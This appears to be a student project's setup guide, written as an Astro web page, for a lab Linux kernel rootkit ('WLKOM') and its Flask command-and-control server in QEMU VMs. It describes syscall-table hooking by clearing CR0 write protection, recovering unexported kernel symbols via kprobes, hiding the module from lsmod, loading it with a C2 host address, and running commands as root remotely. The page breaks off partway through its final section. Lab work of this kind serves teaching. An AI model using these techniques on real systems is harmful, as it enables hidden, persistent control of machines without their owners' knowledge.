---
import BaseHead from '../components/BaseHead.astro';
import Header from '../components/Header.astro';
import Footer from '../components/Footer.astro';
import { Image } from 'astro:assets';
import c2Login from '../assets/c2-login-interface.png';
import c2DashboardOnline from '../assets/c2-dashboard-online.png';
import dmesgImg from '../assets/dmesg.png';
import qemuScreen from '../assets/qemu.png';
---

<!doctype html>
<html lang="en">
<head>
	<BaseHead title="Setup, WLKOM" description="Step-by-step guide to deploy WLKOM from scratch." />
</head>
<body>
	<Header />
	<main>

		<div class="page-header">
			<div class="badge">Step-by-step guide</div>
			<h1>// Setup & Deployment</h1>
			<p class="subtitle">Everything you need to reproduce the WLKOM environment from scratch, on an Arch Linux laptop.</p>
		</div>

		<!-- TOC -->
		<nav class="toc">
			<div class="toc-title">Contents</div>
			<ol>
				<li><a href="#prerequisites">Prerequisites</a></li>
				<li><a href="#qemu">Install QEMU/KVM on the host</a></li>
				<li><a href="#distro-choice">Distro &amp; kernel version choice</a></li>
				<li><a href="#attacker-vm">Attacker machine setup</a></li>
				<li><a href="#victim-vm">Create the victim VM</a></li>
				<li><a href="#victim-postinstall">Post-install configuration</a></li>
				<li><a href="#c2-server">Deploy the C2 server</a></li>
				<li><a href="#build-rootkit">Build the kernel module</a></li>
				<li><a href="#load-rootkit">Load the rootkit on the victim</a></li>
				<li><a href="#verify">Verify the connection</a></li>
			</ol>
		</nav>

		<!-- 1. Prerequisites -->
		<section class="section" id="prerequisites">
			<h2 class="section-title">01 : Prerequisites</h2>
			<p class="section-desc">Before starting, make sure you have the following on your host machine.</p>

			<div class="checklist">
				<div class="check-item">
					<span class="check">✓</span>
					<div>
						<strong>Arch Linux</strong>, the project is developed and tested on the school's Arch Linux laptops. Other distributions should work but are untested.
					</div>
				</div>
				<div class="check-item">
					<span class="check">✓</span>
					<div>
						<strong>CPU with hardware virtualization</strong>, Intel VT-x or AMD-V, enabled in BIOS. Check with:
						<pre><code>grep -c vmx /proc/cpuinfo   # Intel (>0 means supported)
grep -c svm /proc/cpuinfo   # AMD</code></pre>
					</div>
				</div>
				<div class="check-item">
					<span class="check">✓</span>
					<div>
						<strong>An Arch Linux ISO</strong>, download from <code>archlinux.org/download</code>. Used to install the victim VM.
					</div>
				</div>
				<div class="check-item">
					<span class="check">✓</span>
					<div>
						<strong>~30 GB of free disk space</strong>, 24 GB for the victim VM disk image + build artifacts.
					</div>
				</div>
				<div class="check-item">
					<span class="check">✓</span>
					<div>
						<strong>Python 3.10+</strong> and <strong>pip</strong>, for the C2 server.
					</div>
				</div>
			</div>
		</section>

		<!-- 2. Install QEMU -->
		<section class="section" id="qemu">
			<h2 class="section-title">02 : Install QEMU/KVM on the host</h2>
			<p class="section-desc">Install QEMU with KVM support and the virtfs tools needed for the shared folder.</p>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Install the packages</h3>
					<pre><code>sudo pacman -S qemu-full virt-manager libvirt dnsmasq \
               bridge-utils ebtables iptables-nft</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Enable KVM kernel modules</h3>
					<pre><code>sudo modprobe kvm
sudo modprobe kvm_intel   # or kvm_amd depending on your CPU
lsmod | grep kvm          # should show kvm and kvm_intel/kvm_amd</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Add your user to the KVM group</h3>
					<pre><code>sudo usermod -aG kvm $USER
# log out and back in for the group to take effect</code></pre>
				</div>
			</div>

			<div class="info-box">
				<strong>Why QEMU/KVM and not VirtualBox?</strong><br/>
				The subject explicitly requires QEMU/KVM. KVM leverages hardware virtualization directly through the Linux kernel, offering near-native performance without a separate hypervisor layer. It also provides <code>virtfs</code> (9p over virtio) which we use for the shared folder between host and victim VM.
			</div>
		</section>

		<!-- 3. Distro & kernel choice -->
		<section class="section" id="distro-choice">
			<h2 class="section-title">03 : Distro &amp; kernel version choice</h2>
			<p class="section-desc">
				The subject requires us to justify technically why we use this specific distribution
				and kernel version, and what would break with a more recent one.
			</p>

			<h3 class="sub-title">Why Arch Linux?</h3>
			<div class="info-box">
				<p>
					Arch Linux is a rolling-release distribution. The <code>linux</code> and <code>linux-headers</code>
					packages always stay in sync, you never have a mismatch between the running kernel and the
					headers used to compile out-of-tree modules. This is critical: trying to load a
					<code>.ko</code> built against the wrong kernel version produces an immediate
					<code>insmod: ERROR: could not insert module: Invalid module format</code>.
				</p>
				<p>
					The <code>archinstall</code> scripted installer lets us version-control the full VM setup
					(packages, bootloader, SSH config, fstab) in a JSON file, making the environment
					100% reproducible. The school's laptops also run Arch, so package names and kernel
					version are consistent between host and VM.
				</p>
			</div>

			<h3 class="sub-title">Why kernel 6.6 LTS, and not newer?</h3>
			<div class="info-box warn">
				<strong>Three techniques break on recent kernels:</strong>

				<p style="margin-top:0.8em"><strong>1. <code>kallsyms_lookup_name()</code> unexported (≥ 5.7)</strong><br/>
				Finding the syscall table requires resolving the kernel symbol <code>sys_call_table</code>
				(not exported). The standard approach is <code>kallsyms_lookup_name()</code>, but it was
				removed from the exported symbol set in kernel 5.7. Our workaround: register a kprobe
				on <code>kallsyms_lookup_name</code> itself to recover its address, then call it
				directly via the function pointer. This works on 6.6 LTS.</p>

				<p><strong>2. CR0 WP bit trick and Intel CET/IBT (≥ 6.3 on CET-capable CPUs)</strong><br/>
				To write to the read-only syscall table page, we clear the Write-Protect (WP) bit in
				the CPU's CR0 register. On kernels ≥ 6.3 compiled with Intel CET (Control-flow Enforcement
				Technology) support, calling <code>write_cr0()</code> from a module triggers a
				kernel fault on CPUs with IBT (Indirect Branch Tracking) enabled. The school's hardware
				predates widespread CET adoption, so this works on our target. On newer machines, the
				correct approach would be ftrace-based function hooking instead of direct pointer patching.</p>

				<p><strong>3. Kernel lockdown mode</strong><br/>
				Linux 5.4 introduced the Kernel Lockdown LSM. In confidentiality mode it blocks access
				to <code>/proc/kallsyms</code> and prevents loading unsigned modules. Arch Linux does not
				enable lockdown by default (no Secure Boot in QEMU by default either), so this is not
				an issue for us, but it would block our module on a hardened Ubuntu or Fedora install.</p>

				<p><strong>Verdict:</strong> We target <strong>Linux 6.6 LTS</strong> (supported until
				December 2026) because it is the most recent LTS on which all our techniques work
				reliably on the school's hardware without additional kernel configuration.</p>
			</div>
		</section>

		<!-- 4. Attacker machine -->
		<section class="section" id="attacker-vm">
			<h2 class="section-title">04 : Attacker machine setup</h2>
			<p class="section-desc">
				The C2 server (attacking program) runs on the host machine or a dedicated attacker VM.
				In our setup, we run it directly on the host for simplicity, the QEMU user networking
				stack makes the host reachable from all VMs at <code>10.0.2.2</code>.
			</p>

			<div class="info-box">
				<strong>Why run on the host and not a separate attacker VM?</strong><br/>
				In a real-world scenario, the attacking program runs on a public server with a fixed IP.
				For this pedagogical project, the host machine plays that role. QEMU's user-mode networking
				NATs all VM traffic through the host, the VM can reach the host at <code>10.0.2.2</code>
				(QEMU's default gateway) without any special network configuration. A separate attacker VM
				would add complexity with no educational benefit.
			</div>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Install Python 3 and pip</h3>
					<pre><code>sudo pacman -S python python-pip</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Clone the repository</h3>
					<pre><code>git clone &lt;repo-url&gt;
cd epirootkit</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Find your host IP (for the rootkit to connect to)</h3>
					<p>From inside any QEMU VM with user networking, the host is always at:</p>
					<pre><code>10.0.2.2</code></pre>
					<p>This is the address you will pass to <code>insmod</code> as the <code>c2_host</code> parameter.</p>
				</div>
			</div>
		</section>

		<!-- 5. Victim VM -->
		<section class="section" id="victim-vm">
			<h2 class="section-title">05 : Create the victim VM</h2>
			<p class="section-desc">The victim runs Arch Linux with the rootkit loaded in its kernel. We automate installation with <code>archinstall</code>.</p>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Create the VM disk and boot the ISO</h3>
					<p>From the <code>virtual-machines/victim/</code> directory, run the creation script with the path to your Arch ISO:</p>
					<pre><code>cd virtual-machines/victim
./create-vm.sh /path/to/archlinux-x86_64.iso</code></pre>
					<p>This creates a 24 GB raw disk image and boots the VM from the ISO. QEMU will open a window with the Arch live environment.</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Mount the shared folder inside the VM</h3>
					<p>Inside the live Arch environment, mount the shared folder (which contains our install configs):</p>
					<pre><code>mkdir /mnt/share
mount -t 9p -o trans=virtio epirootkit /mnt/share</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Run archinstall with our configuration</h3>
					<p>We provide pre-made configuration files for a fully automated install:</p>
					<pre><code>archinstall \
  --config /mnt/share/user_configuration.json \
  --creds  /mnt/share/user_credentials.json \
  --silent</code></pre>

					<div class="info-box" style="margin-top:1em">
						<strong>What the configuration installs:</strong>
						<ul style="margin:0.5em 0 0; padding-left:1.2em; color:var(--muted); font-size:0.9em">
							<li>Arch Linux with GRUB bootloader on <code>/dev/sda</code></li>
							<li>Packages: <code>linux-headers</code>, <code>gcc</code>, <code>make</code>, <code>openssh</code>, <code>vim</code></li>
							<li>Shared folder auto-mounted at <code>/mnt/share</code> via <code>/etc/fstab</code></li>
							<li>SSH configured to allow root login (<code>PermitRootLogin yes</code>)</li>
						</ul>
					</div>
				</div>
			</div>

			<div class="step">
				<div class="step-num">4</div>
				<div class="step-body">
					<h3>Reboot and start the VM normally</h3>
					<p>Once installation completes, shut down the VM and start it without the ISO:</p>
					<pre><code>./start-vm.sh</code></pre>
					<p>This starts the VM with SSH forwarded to host port <code>10022</code> and the shared folder mounted.</p>
					<div class="screenshot-wrap">
						<Image src={qemuScreen} width={801} height={599} alt="QEMU GRUB boot screen" class="screenshot-img" />
					</div>
				</div>
			</div>

			<div class="step">
				<div class="step-num">5</div>
				<div class="step-body">
					<h3>SSH into the victim VM</h3>
					<pre><code>ssh root@localhost -p 10022
# default password: root</code></pre>

					<div class="placeholder">
						<div class="placeholder-icon">📸</div>
						<p><strong>Screenshot à ajouter :</strong> terminal SSH connecté à la VM victime, avec le prompt <code>root@archlinux</code>.</p>
					</div>
				</div>
			</div>

			<div class="info-box">
				<strong>Why Arch Linux for the victim?</strong><br/>
				Arch ships with a very recent kernel and provides the <code>linux-headers</code> package which is mandatory to compile out-of-tree kernel modules against the running kernel. The <code>archinstall</code> tool lets us automate the entire installation with a single JSON config, making setup reproducible.
			</div>

			<div class="info-box warn">
				<strong>Why not a more recent kernel?</strong><br/>
				Linux 6.x introduced stricter lockdown policies and restricted access to <code>/proc/kallsyms</code>, which is needed to resolve kernel symbols for syscall hooking (used by our hide feature). On kernels beyond 6.6 LTS, additional steps would be needed to disable lockdown mode. We target <strong>6.6 LTS</strong> to keep the setup straightforward while still using a modern kernel.
			</div>
		</section>

		<!-- 5b. Post-install -->
		<section class="section" id="victim-postinstall">
			<h2 class="section-title">06 : Post-install configuration</h2>
			<p class="section-desc">After the first boot, a few manual steps are required.</p>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Verify the kernel version</h3>
					<pre><code>ssh root@localhost -p 10022
uname -r
# expected: 6.6.x-arch1-1 (or similar)</code></pre>
					<p>If the kernel is older, update with <code>pacman -Syu</code> and reboot.</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Verify linux-headers are installed</h3>
					<pre><code>pacman -Q linux-headers
# should print: linux-headers 6.6.x-x</code></pre>
					<p>If missing: <code>pacman -S linux-headers</code></p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Verify the shared folder is mounted</h3>
					<pre><code>ls /mnt/share
# should list the contents of virtual-machines/victim/sharedfs/</code></pre>
					<p>If it's empty, the 9p mount failed. Check <code>dmesg | grep 9p</code> and verify
					<code>start-vm.sh</code> includes the <code>-virtfs</code> option.</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">4</div>
				<div class="step-body">
					<h3>Verify network connectivity to the host</h3>
					<pre><code>ping -c 3 10.0.2.2
# 3 packets transmitted, 3 received</code></pre>
					<p>This confirms the rootkit will be able to reach the C2 server once loaded.</p>
				</div>
			</div>

			<div class="info-box warn">
				<strong>Security note, PermitRootLogin</strong><br/>
				Our <code>archinstall</code> config sets <code>PermitRootLogin yes</code> in
				<code>/etc/ssh/sshd_config</code>. This allows password-based root login for ease of
				deployment in a controlled lab environment. In any real scenario this would be disabled.
				We document this explicitly because the subject requires justification for every
				security trade-off.
			</div>
		</section>

		<!-- 7. C2 Server -->
		<section class="section" id="c2-server">
			<h2 class="section-title">07 : Deploy the C2 server</h2>
			<p class="section-desc">The C2 server runs on your host machine (or attacker VM). It listens on port 5000.</p>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Install Python dependencies</h3>
					<pre><code>cd attacking_program
pip install -r requirements.txt</code></pre>
					<p>Dependencies: <code>flask</code>, <code>python-dotenv</code>.</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Configure the environment</h3>
					<pre><code>cp .env.example .env</code></pre>
					<p>Edit <code>.env</code> and set a strong <code>SECRET_KEY</code> and your <code>ADMIN_PASSWORD</code>:</p>
					<pre><code>SECRET_KEY=your-long-random-secret-key
ADMIN_PASSWORD=yourpassword</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Start the server</h3>
					<pre><code>python app.py</code></pre>
					<p>The server starts on <code>0.0.0.0:5000</code>. Open <code>http://localhost:5000</code> in your browser and log in with your <code>ADMIN_PASSWORD</code>.</p>

					<div class="login-screenshot">
						<Image src={c2Login} width={979} height={570} alt="WLKOM C2 login page" class="screenshot-img" />
					</div>
				</div>
			</div>
		</section>

		<!-- 8. Build rootkit -->
		<section class="section" id="build-rootkit">
			<h2 class="section-title">08 : Build the kernel module</h2>
			<p class="section-desc">The rootkit must be compiled on a machine running the same kernel version as the victim VM.</p>

			<div class="info-box warn">
				<strong>Important:</strong> the module must be compiled against the kernel headers of the machine where it will be loaded. Compile it <strong>inside the victim VM</strong> for guaranteed compatibility, or on a host running the exact same kernel version.
			</div>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Copy the source to the shared folder</h3>
					<p>From the host, copy the <code>rootkit/</code> directory into <code>virtual-machines/victim/sharedfs/</code>, it will automatically appear at <code>/mnt/share/rootkit/</code> inside the VM.</p>
					<pre><code>cp -r rootkit/ virtual-machines/victim/sharedfs/</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Build inside the victim VM</h3>
					<pre><code>ssh root@localhost -p 10022
cd /mnt/share/rootkit
make modules</code></pre>
					<p>This produces <code>src/wlkom.ko</code> compiled against the running kernel (<code>/lib/modules/$(uname -r)/build</code>).</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Copy the .ko to the shared folder root</h3>
					<pre><code># still inside the VM
cp /mnt/share/rootkit/src/wlkom.ko /mnt/share/wlkom.ko</code></pre>
					<p>The compiled <code>wlkom.ko</code> is now available at <code>virtual-machines/victim/sharedfs/wlkom.ko</code> on the host.</p>
				</div>
			</div>
		</section>

		<!-- 9. Load rootkit -->
		<section class="section" id="load-rootkit">
			<h2 class="section-title">09 : Load the rootkit on the victim</h2>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Find the host IP from the victim's perspective</h3>
					<p>In QEMU user networking, the host is always reachable at <code>10.0.2.2</code> from inside the VM. This is the IP to pass as <code>c2_host</code>.</p>
					<pre><code># verify from inside the VM
ping 10.0.2.2</code></pre>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Load the module</h3>
					<pre><code>insmod /mnt/share/wlkom.ko c2_host=10.0.2.2</code></pre>
					<p>The module will register with the C2 server, store its UUID in <code>/rootkit/uuid</code>, and start polling every 5 seconds.</p>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Unload the module</h3>
					<pre><code>rmmod wlkom</code></pre>
					<div class="info-box" style="margin-top:0.8em">
						The module hides itself from <code>lsmod</code>, you will not see it listed. Use <code>rmmod wlkom</code> (by name) to unload it even though it is hidden.
					</div>
				</div>
			</div>
		</section>

		<!-- 10. Verify -->
		<section class="section" id="verify">
			<h2 class="section-title">10 : Verify the connection</h2>

			<div class="step">
				<div class="step-num">1</div>
				<div class="step-body">
					<h3>Check kernel logs on the victim</h3>
					<pre><code>dmesg | tail -20</code></pre>
					<p>You should see something like:</p>
					<pre><code>[ ...] wlkom: loading out-of-tree module taints kernel.
[ ...] wlkom: module verification failed: signature or key missing - tainting kernel
[ ...] c2: existing uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code></pre>
					<p><code>existing</code> means the UUID was already saved from a previous load. On the very first <code>insmod</code> you will see <code>c2: registered uuid=...</code> instead.</p>

					<div class="screenshot-wrap">
						<Image src={dmesgImg} width={775} height={490} alt="dmesg output after insmod" class="screenshot-img" />
					</div>
				</div>
			</div>

			<div class="step">
				<div class="step-num">2</div>
				<div class="step-body">
					<h3>Check the C2 dashboard</h3>
					<p>Open <code>http://localhost:5000</code>, the victim machine should appear with a green online indicator.</p>

					<div class="screenshot-wrap">
						<Image src={c2DashboardOnline} width={1226} height={714} alt="C2 dashboard with victim online" class="screenshot-img" />
					</div>
				</div>
			</div>

			<div class="step">
				<div class="step-num">3</div>
				<div class="step-body">
					<h3>Send a test command</h3>
					<p>Click <strong>+ Action</strong> on the machine card → <strong>Execute Command</strong> → type <code>whoami</code> → Send.</p>
					<p>Within 5 seconds the result should appear in the dashboard with <code>stdout: root</code>.</p>

					<div class="placeholder">
						<div class="placeholder-icon">📸</div>
						<p><strong>Screenshot à ajouter :</strong> résultat de la commande <code>whoami</code> dans le dashboard.</p>
					</div>
				</div>
			</div>

			<div class="step">
